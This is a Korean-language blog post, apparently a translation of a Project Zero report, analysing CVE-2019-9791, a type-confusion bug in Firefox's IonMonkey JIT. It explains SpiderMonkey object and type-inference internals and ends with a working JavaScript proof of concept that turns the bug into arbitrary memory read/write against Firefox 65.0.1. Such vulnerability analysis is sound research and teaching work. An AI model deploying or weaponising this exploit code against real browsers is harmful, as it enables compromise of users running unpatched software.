<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="CVE-2019-9791 Analysis" /><meta name="author" content="nonetype" /><meta property="og:locale" content="en_US" /><meta name="description" content="CVE-2019-9791 Firefox IonMonkey Type confusion vulnerability analysis" /><meta property="og:description" content="CVE-2019-9791 Firefox IonMonkey Type confusion vulnerability analysis" /><link rel="canonical" href="https://nonetype.kr/posts/CVE-2019-9791-Analysis/" /><meta property="og:url" content="https://nonetype.kr/posts/CVE-2019-9791-Analysis/" /><meta property="og:site_name" content="do:pwn()" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-03-31T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="CVE-2019-9791 Analysis" /><meta name="twitter:site" content="@nonetype_pwn" /><meta name="twitter:creator" content="@nonetype" /><meta name="google-site-verification" content="googlef894166fa16bb09c" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"nonetype"},"description":"CVE-2019-9791 Firefox IonMonkey Type confusion vulnerability analysis","url":"https://nonetype.kr/posts/CVE-2019-9791-Analysis/","headline":"CVE-2019-9791 Analysis","dateModified":"2020-12-02T12:40:53+08:00","datePublished":"2020-03-31T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://nonetype.kr/posts/CVE-2019-9791-Analysis/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>CVE-2019-9791 Analysis | do:pwn()</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="do:pwn()"><meta name="application-name" content="do:pwn()"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-HLXHMG7DE3"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-HLXHMG7DE3'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/me.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">do:pwn()</a></div><div class="site-subtitle font-italic">AttributeError - 'NoneType'</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/nonetype" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/nonetype_pwn" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['exploit','kakao.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>CVE-2019-9791 Analysis</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>CVE-2019-9791 Analysis</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> nonetype </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Mar 31, 2020, 12:00 AM +0800" prep="on" > Mar 31, 2020 <i class="unloaded">2020-03-31T00:00:00+08:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Dec 2, 2020, 1:40 PM +0900" prefix="Updated " > Dec 2, 2020 <i class="unloaded">2020-12-02T12:40:53+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2971 words">16 min</span></div></div><div class="post-content"><p>CVE-2019-9791 Firefox IonMonkey Type confusion vulnerability analysis</p><h1 id="index">Index</h1><ul><li><a href="#index">Index</a><li><a href="#cve-2019-9791">CVE-2019-9791</a><ul><li><a href="#prerequisites-knowledge">Prerequisites knowledge</a><li><a href="#bug-description">Bug Description</a><li><a href="#exploitation">Exploitation</a></ul></ul><h1 id="cve-2019-9791">CVE-2019-9791</h1><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1791">Issue 1791: Spidermonkey: IonMonkey’s type inference is incorrect for constructors entered via OSR</a> - credit to saelo</p><p><strong>Translated to KOR</strong>(may include some typo/mis-translations)</p><p>해당 버그는 JIT 컴파일과 On-stack replacement(OSR)을 통한 생성자 함수 진입 시 임의의 두 객체 사이의 type confusion을 일으킬 수 있는 함수의 컴파일을 허용합니다.</p><h2 id="prerequisites-knowledge">Prerequisites knowledge</h2><ol><li><p>SpiderMonkey는 “plain” 객체를 <a href="https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/NativeObject.h#L431">NativeObject</a>와 <a href="https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/UnboxedObject.h#L168">UnboxedObject</a>로 표현할 수 있습니다. NativeObject는 기본적으로 Inline/Out-of-line properties와 Elements를 표현하기 위한 두개의 포인터, Group과 Shape를 가지고 있습니다. 반면에 UnboxedObject는 속성들(properties)을 unboxed form(예를 들어, 32bit 정수 혹은 8bit Boolean까지)으로 저장할 수 있습니다. UnboxedObject는 언제든지 NativeObject로 변환될 수 있습니다(속성들을 boxing하고, NativeObject의 Out-of-line props에 할당함으로써) 변환은 속성 할당시 새 값의 타입이 기존 속성의 타입과 일치하지 않는 경우에 발생하며, 변환 함수는 <a href="https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/NativeObject.h#L431">여기</a>서 확인할 수 있습니다.</p><li><p>SpiderMonkey는 타입 추론을 위해 가능한 타입의 오브젝트 속성을 추적할 수 있습니다. (<a href="https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/ObjectGroup.h#L111">참고</a>) 예를 들어, 아래 코드를 실행하면 SpiderMonkey가 속성 <code class="language-plaintext highlighter-rouge">.x</code>가 항상 Uint8Array로 이루어진다는 것을 알고, JIT 컴파일된 코드의 타입 체크를 생략하게 됩니다.(해당 코드 이후에 속성 <code class="language-plaintext highlighter-rouge">.x</code>에 다른 타입의 값을 할당하는 코드가 실행되지 않았다고 가정합니다.)</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> <span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{};</span>
 <span class="nx">o</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
</pre></table></code></div></div><p>해당 속성(<code class="language-plaintext highlighter-rouge">.x</code>)에 다른 타입의 값을 할당하면, 추론된 타입을 무효화하고 해당 추론에 의존하는 JIT 코드를 무효화시킬 것입니다.</p><li><p>SpiderMonkey의 생성자는 초기화가 완료된 후 생성된 객체의 타입을 나타내는 “템플릿” 타입(Group 또는 Shape)을 가질 수 있습니다. 해당 생성자의 호출자는 해당 템플릿 타입의 객체를 할당(js::CreateThisForFunction 함수를 통해)하여 생성자에 인자로 념겨줘야 하는 의무가 있습니다. 따라서, JIT 컴파일 된 생성자 코드는 템플릿 타입의 객체를 넘겨받는 것에 의존적일 수 있으며, and can use that to emit code for property stores to existing properties instead of code for property definitions (which in addition to writing the property value also have to update the Shape of the object). <strong>(아무리 읽어도 독해가 안되어 원문으로 남겨놓습니다)</strong></p><p>예를 들어, 다음과 같은 생성자 함수를 가정해봅시다.</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> <span class="kd">function</span> <span class="nx">Ctor</span><span class="p">()</span> <span class="p">{</span>
     <span class="k">this</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
     <span class="k">this</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">43</span><span class="p">;</span>
 <span class="p">}</span>
</pre></table></code></div></div><p>몇차례 호출 후, 타입 추론 시스템(Type inference system)은 생성된 객체의 최종 타입을 계산합니다. 이 경우, 해당 객체는 <code class="language-plaintext highlighter-rouge">.a</code>와 <code class="language-plaintext highlighter-rouge">.b</code>라는 두개의 정수 속성을 가진 UnboxedObject일 수 있습니다. 이후 IonMonkey가 해당 생성자에 대한 JIT 컴파일을 시작할 것이고, 호출자가 항상 템플릿 타입이 존재하는 객체를 전달해 준다는 사실에 의존함으로써 IonMonkey는 단순하게 기존 속성 슬롯(property slots)에 두 값을 저장하는 코드를 생성할수도 있습니다. 이 최적화는 생성된 객체가 최종적인 속성 정의 전에 로컬 범위를 벗어나지 않는다는 것을 SpiderMonkey가 증명할 수 있는 경우에만 가능합니다.(따라서 코드에 실제 정의되기 전, 실행중인 스크립트에서 속성의 존재는 확인할 수 없습니다.) 생성자의 최종 타입은 <a href="https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/TypeInference-inl.h#L241">여기</a>서 계산됩니다.</p></ol><h2 id="bug-description">Bug Description</h2><p>아래 코드를 현재 릴리즈 되어 있는 SpiderMonkey에서 실행시 잘못된 동작을 확인 가능합니다.: 이 코드는 분명 존재해야 하는 속성인 <code class="language-plaintext highlighter-rouge">.x</code> 를 출력해주지 않습니다. 이 코드를 약간 변경하면, <code class="language-plaintext highlighter-rouge">.x</code>를 선언하는 부분에서 <code class="language-plaintext highlighter-rouge">Nullderef</code> 크래시가 발생하게 됩니다.(원본 샘플이 퍼징 중 이 방식으로 발견되었습니다.)</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">Hax</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">l</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">l</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{}</span>

    <span class="k">this</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">new</span> <span class="nx">Hax</span><span class="p">(</span><span class="mi">1337</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
<span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Hax</span><span class="p">(</span><span class="dl">"</span><span class="s2">asdf</span><span class="dl">"</span><span class="p">,</span> <span class="mi">100000</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">getOwnPropertyNames</span><span class="p">(</span><span class="nx">obj</span><span class="p">));</span>
<span class="c1">// prints only "a"</span>
</pre></table></code></div></div><p>위 코드를 실행하면 아래와 같은 동작이 이루어집니다.</p><ol><li><p>외부 루프(<code class="language-plaintext highlighter-rouge">new Hax(1337, 1); 을 반복적으로 호출하는 루프</code>)에서 반복적으로 호출이 이루어질 때, SpiderMonkey의 타입 추론 시스템(Type inference system)은 생성된 객체에 대한 최종 타입을 계산합니다(정수 타입의 <code class="language-plaintext highlighter-rouge">.a</code>와 <code class="language-plaintext highlighter-rouge">.x</code> 속성을 가지고 있는 UnboxedObject로) 이후 생성자가 IonMonkey에 의해 JIT 컴파일되기 시작하는데, 이 때 타입 추론을 사용하여 속성을 정의해서 속성을 저장하는 것이 아닌, 존재하던 속성에 속성을 저장하는 코드를 생성합니다.</p><li>마지막 호출(<code class="language-plaintext highlighter-rouge">let obj = new Hax("asdf", 100000);</code>)이 이루어질 때, JIT 코드는 <code class="language-plaintext highlighter-rouge">.a</code> 속성을 설정하기 위한 시도를 하게 됩니다. 그러나, 인자로 넘겨진 값이 잘못된 타입(정수 타입이 아닌 문자열 타입이 넘겨짐)이므로 아래와 같은 행위를 일으킵니다.<ul><li>|this| 객체가 <code class="language-plaintext highlighter-rouge">.a</code>, <code class="language-plaintext highlighter-rouge">.x</code> 속성을 가지고 있는 NativeObject로 변환됩니다.(기존 UnboxedObject -&gt; NativeObject)<li><code class="language-plaintext highlighter-rouge">Hax</code> 함수의 반환 타입이 <code class="language-plaintext highlighter-rouge">.a</code>, <code class="language-plaintext highlighter-rouge">.x</code> 속성을 가지고 있는 NativeObject로 변경됩니다.(생성자에 대한 타입 추론은 여전히 <code class="language-plaintext highlighter-rouge">.a</code>, <code class="language-plaintext highlighter-rouge">.x</code> 속성이 존재함을 증명할 수 있습니다.)<li><p>이후 |this| 객체는 <a href="https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/TypeInference.cpp#L4234">bytecode</a>에서 이 위치에 있어야 하는 타입으로 ‘롤백’ 됩니다. (원문으로 보는 것을 추천)</p><p>이후 |this| 의 Shape는 속성 <code class="language-plaintext highlighter-rouge">.a</code>의 존재만을 나타내게 됩니다.(코드의 현재 위치에 맞는 타입으로)</p><p>아마 이 동작은 생성된 객체가 코드에 정의되기 전, 이미 최종 속성의 집합을 가지고 있음이 갑작스럽게 확인되는 상황을 피하기 위해 수행되는 것 같습니다.(초기 분석이 생성자에서 호출된 일부의 함수 혹은 메소드가 항상 특정된, 알려진 함수이고 인라인 되었다는 가정에 의존하는 경우 발생합니다.)</p><li>타입 추정이 변경되었기 때문에, JIT 코드는 최적화가 해제되어 baseline JIT으로 실행이 계속됩니다.</ul><li><p>그 다음 루프에서 IonMonkey가 다시 <code class="language-plaintext highlighter-rouge">Hax</code> 함수의 컴파일을 시작하고, 함수의 중간 부분(루프의 시작 부분)의 on-stack replacement(OSR)을 통해 JIT 컴파일 된 코드로 들어갑니다. 컴파일 중, IonMonkey는 또다시 <code class="language-plaintext highlighter-rouge">Hax</code>의 템플릿 타입에 의존하게 되고 |this| 객체가 <code class="language-plaintext highlighter-rouge">.a</code>, <code class="language-plaintext highlighter-rouge">.x</code> 속성을 가진 NativeObject일 것이라고 결론을 내리게 됩니다. 이 행동은 <code class="language-plaintext highlighter-rouge">2-3</code>에서 <code class="language-plaintext highlighter-rouge">.x</code> 속성이 롤백으로 인해 사라졌으므로 잘못된 행동입니다.</p><li>루프가 끝난 후, JIT 코드는 객체에 이미 최종 Shape가 존재한다고 믿고 있기 때문에 속성의 저장만을 수행하게 됩니다. 따라서 <code class="language-plaintext highlighter-rouge">.x</code> 속성의 저장은 ‘잊혀지게’ 되고, <code class="language-plaintext highlighter-rouge">Object.getOwnPropertyNames();</code>의 결과값은 <code class="language-plaintext highlighter-rouge">.a</code> 속성의 존재만을 보여주게 됩니다.</ol><h2 id="exploitation">Exploitation</h2><p>OSR 이후 JIT 컴파일 된 코드는 |this| 객체가 이미 최종 타입을 가지고 있는 것으로 생각하여 Shape를 갱신하지 하지 않고 속성 값을 저장하기만 합니다. 결과적으로 <code class="language-plaintext highlighter-rouge">.x</code> 속성은 보이지 않게 되고 이후 생성된 객체에 정의된 다음 속성은 <code class="language-plaintext highlighter-rouge">.x</code>가 JIT 컴파일 된 코드에 작성된 것과 동일한 슬롯이 할당됩니다. 이것을 이용하여 속성에 대한 타입 추론 메커니즘을 남용(abuse)하는 아래의 공격이 가능해집니다.</p><p>JIT 컴파일 된 코드에서 루프 이후:</p><ol><li>위에서 봤던 내용과 동일하게 <code class="language-plaintext highlighter-rouge">.x</code> 속성을 |this| 객체에 정의합니다. 컴파일러는 <code class="language-plaintext highlighter-rouge">.x</code>의 타입을 ‘타입 X’로 추론할 것입니다. 그러면 이 속성은 버그로 인해 최종 호출에서 “잊혀질” 것입니다.<li>객체에 대한 새로운 속성(‘타입 Y’인) 정의합니다. 그러면 해당 속성은 <code class="language-plaintext highlighter-rouge">.x</code>와 동일한 슬롯에 저장되게 됩니다.(객체의 Shape는 해당 슬롯이 비어있다고 생각하기 때문입니다.) 이 과정은 타입 유츄에 의존하지 않으며 객체의 Shape를 검사하고 비어있는 다음 슬롯을 결정하는 “Slow path” 속성 정의여야 합니다.<li><code class="language-plaintext highlighter-rouge">.x</code> 속성을 다시 불러옵니다. 컴파일러는 불러온 값의 타입을 ‘타입 X’로 추론하지만, 실제 불러온 객체의 타입은 ‘타입 Y’입니다.</ol><p>결과적으로 ‘타입 X’ 객체와 ‘타입 Y’ 객체를 혼란시킬 수 있는 JIT 코드를 컴파일 할 수 있습니다. 여기서 X와 Y는 임의로 선택될 수 있습니다.</p><p>다음 JavaScript 프로그램(로컬 SpiderMonkey와 Firefox 65.0.1 버전에서 테스트함)은 위에서 설명한 아이디어를 증명합니다. 먼저 Float64Array와 사용자가 정의한 UnboxedObject 사이의 Type Confusion을 발생시켜 임의 주소 읽기/쓰기를 가능하게 하고, 최종적으로 <code class="language-plaintext highlighter-rouge">0x414141414141</code> 주소에 값을 쓰다가 크래시를 일으킵니다.</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre><td class="rouge-code"><pre><span class="kd">let</span> <span class="nx">ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">victim</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>

<span class="kd">function</span> <span class="nx">Hax</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">l</span><span class="p">,</span> <span class="nx">trigger</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// In the final invocation:</span>

    <span class="c1">// Ultimately confuse these two objects which each other.</span>
    <span class="c1">// x will (eventually) be an UnboxedObject, looking a bit like an ArrayBufferView object... :)</span>
    <span class="kd">let</span> <span class="nx">x</span> <span class="o">=</span> <span class="p">{</span><span class="na">slots</span><span class="p">:</span> <span class="mf">13.37</span><span class="p">,</span> <span class="na">elements</span><span class="p">:</span> <span class="mf">13.38</span><span class="p">,</span> <span class="na">buffer</span><span class="p">:</span> <span class="nx">ab</span><span class="p">,</span> <span class="na">length</span><span class="p">:</span> <span class="mf">13.39</span><span class="p">,</span> <span class="na">byteOffset</span><span class="p">:</span> <span class="mf">13.40</span><span class="p">,</span> <span class="na">data</span><span class="p">:</span> <span class="p">[]};</span>
    <span class="c1">// y is a real ArrayBufferView object.</span>
    <span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>

    <span class="c1">// * Trigger a conversion of |this| to a NativeObject.</span>
    <span class="c1">// * Update Hax's template type to NativeObject with .a and .x (and potentially .y)</span>
    <span class="c1">// * Trigger the "roll back" of |this| to a NativeObject with only property .a</span>
    <span class="c1">// * Bailout of the JITed code due to type inference changes</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>

    <span class="c1">// Trigger JIT compilation and OSR entry here. During compilation, IonMonkey will</span>
    <span class="c1">// incorrectly assume that |this| already has the final type (so already has property .x)</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">l</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{}</span>

    <span class="c1">// The JITed code will now only have a property store here and won't update the Shape.</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">trigger</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// This property definition is conditional (and rarely used) so that an inline cache</span>
        <span class="c1">// will be emitted for it, which will inspect the Shape of |this|. As such, .y will</span>
        <span class="c1">// be put into the same slot as .x, as the Shape of |this| only shows property .a.</span>
        <span class="k">this</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="nx">y</span><span class="p">;</span>

        <span class="c1">// At this point, .x and .y overlap, and the JITed code below believes that the slot</span>
        <span class="c1">// for .x still stores the UnboxedObject while in reality it now stores a Float64Array.</span>
    <span class="p">}</span>

    <span class="c1">// This assignment will then corrupt the data pointer of the Float64Array to point to |victim|.</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">x</span><span class="p">.</span><span class="nx">data</span> <span class="o">=</span> <span class="nx">victim</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">new</span> <span class="nx">Hax</span><span class="p">(</span><span class="mi">1337</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
<span class="p">}</span>
<span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Hax</span><span class="p">(</span><span class="dl">"</span><span class="s2">asdf</span><span class="dl">"</span><span class="p">,</span> <span class="mi">10000000</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

<span class="c1">// Driver is now a Float64Array whose data pointer points to a Uint8Array.</span>
<span class="kd">let</span> <span class="nx">driver</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">y</span><span class="p">;</span>

<span class="c1">// Write to address 0x414141414141 as PoC</span>
<span class="nx">driver</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mf">3.54484805889626</span><span class="nx">e</span><span class="o">-</span><span class="mi">310</span><span class="p">;</span>
<span class="nx">victim</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pwn/'>pwn</a>, <a href='/categories/browser/'>browser</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/firefox/" class="post-tag no-text-decoration" >firefox</a> <a href="/tags/1-day/" class="post-tag no-text-decoration" >1-day</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=CVE-2019-9791 Analysis - do:pwn()&url=https://nonetype.kr/posts/CVE-2019-9791-Analysis/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=CVE-2019-9791 Analysis - do:pwn()&u=https://nonetype.kr/posts/CVE-2019-9791-Analysis/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=CVE-2019-9791 Analysis - do:pwn()&url=https://nonetype.kr/posts/CVE-2019-9791-Analysis/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DLL-Hijacking/">DLL Hijacking Note</a><li><a href="/posts/BlazeCTF2018-blazeme-write-up/">blazeme - BlazeCTF 2018</a><li><a href="/posts/Linux-Kernel-Exploit-Development-lab1/">Linux Kernel Exploit Development (Part 1/10)</a><li><a href="/posts/Linux-Kernel-Exploit-Development-lab2/">Linux Kernel Exploit Development (Part 2/10)</a><li><a href="/posts/Linux-Kernel-Exploit-Development-lab3/">Linux Kernel Exploit Development (Part 3/10)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/debugging/">debugging</a> <a class="post-tag" href="/tags/tutorial/">tutorial</a> <a class="post-tag" href="/tags/tips/">tips</a> <a class="post-tag" href="/tags/firefox/">firefox</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/1-day/">1-day</a> <a class="post-tag" href="/tags/analysis/">analysis</a> <a class="post-tag" href="/tags/ctf/">ctf</a></div></div></div><script 